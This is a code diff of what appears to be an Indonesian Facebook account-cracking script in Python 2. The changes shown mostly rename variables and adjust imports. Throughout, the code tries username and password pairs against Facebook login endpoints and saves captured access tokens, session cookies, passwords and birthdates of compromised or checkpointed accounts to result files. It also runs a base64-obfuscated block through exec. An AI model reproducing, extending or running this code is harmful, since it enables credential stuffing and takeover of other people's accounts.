@@ -34,11 +34,11 @@ try:
 except ImportError:
     os.system('pip2 install bs4')
     
-import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, marshal
+import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
 from concurrent.futures import ThreadPoolExecutor as Lampung
-from datetime import datetime
-from bs4 import BeautifulSoup 
+from bs4 import BeautifulSoup as parser
 from time import sleep as jeda
+from datetime import datetime
 exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))
 
 ok = []
@@ -440,9 +440,9 @@ class zona_akun_facebook_indonesia:
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
                 print '\r %s*--> %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
-                wrt = ' *--> %s|%s|%s'% (user,pw,response.json()['access_token'])
-                ok.append(wrt)
-                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                sv = ' *--> %s|%s|%s'% (user,pw,response.json()['access_token'])
+                ok.append(sv)
+                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
             elif 'www.facebook.com' in response.json()['error_msg']:
@@ -452,9 +452,9 @@ class zona_akun_facebook_indonesia:
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s*--> %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
-                    wrt = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    sv = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(sv)
+                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                     break
                 except (KeyError, IOError):
                     month = ''
@@ -463,9 +463,9 @@ class zona_akun_facebook_indonesia:
                 except:
                     pass
                 print '\r %s*--> %s|%s           ' % (K,user,pw)
-                wrt = ' *--> %s|%s' % (user,pw)
-                cp.append(wrt)
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                sv = ' *--> %s|%s' % (user,pw)
+                cp.append(sv)
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
 
@@ -490,9 +490,9 @@ class zona_akun_facebook_indonesia:
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s|%s|%s  ' % (H,user,pw,kuki)
-                wrt = ' *--> %s|%s|%s' % (user,pw,kuki)
-                ok.append(wrt)
-                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                sv = ' *--> %s|%s|%s' % (user,pw,kuki)
+                ok.append(sv)
+                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
@@ -502,9 +502,9 @@ class zona_akun_facebook_indonesia:
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s*--> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
-                    wrt = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    sv = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(sv)
+                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                     break
                 except (KeyError, IOError):
                     month = ''
@@ -513,9 +513,9 @@ class zona_akun_facebook_indonesia:
                 except:
                     pass
                 print '\r %s*--> %s|%s            ' % (K,user,pw)
-                wrt = ' *--> %s|%s' % (user,pw)
-                cp.append(wrt)
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                sv = ' *--> %s|%s' % (user,pw)
+                cp.append(sv)
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
 
@@ -556,9 +556,9 @@ class zona_akun_facebook_indonesia:
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s|%s|%s ' % (H,user,pw,kuki)
-                wrt = ' *--> %s|%s|%s' % (user,pw,kuki)
-                ok.append(wrt)
-                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                sv = ' *--> %s|%s|%s' % (user,pw,kuki)
+                ok.append(sv)
+                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
@@ -568,9 +568,9 @@ class zona_akun_facebook_indonesia:
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s*--> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
-                    wrt = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
-                    cp.append(wrt)
-                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    sv = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(sv)
+                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                     break
                 except (KeyError, IOError):
                     month = ''
@@ -579,9 +579,9 @@ class zona_akun_facebook_indonesia:
                 except:
                     pass
                 print '\r %s*--> %s|%s              ' % (K,user,pw)
-                wrt = ' *--> %s|%s' % (user,pw)
-                cp.append(wrt)
-                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                sv = ' *--> %s|%s' % (user,pw)
+                cp.append(sv)
+                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
 
